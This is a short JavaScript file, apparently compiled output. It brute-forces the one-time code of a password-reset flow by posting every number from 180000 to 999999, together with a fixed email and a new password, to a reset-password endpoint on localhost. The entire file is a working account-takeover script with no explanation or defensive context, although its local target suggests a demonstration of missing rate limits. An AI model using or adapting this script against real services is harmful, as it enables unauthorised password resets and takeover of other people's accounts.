import axios from "axios";
async function sendOtpRequest(otp) {
    let data = JSON.stringify({
        email: "ankit123@gmail.com",
        otp: otp,
        newPassword: "ankitstill",
    });
    let config = {
        method: "post",
        maxBodyLength: Infinity,
        url: "http://localhost:4141/reset-password",
        headers: {
            "Content-Type": "application/json",
        },
        data: data,
    };
    await axios.request(config);
}
for (let i = 180000; i < 999999; i++) {
    sendOtpRequest(i.toString());
    console.log(i);
}
//# sourceMappingURL=index.js.map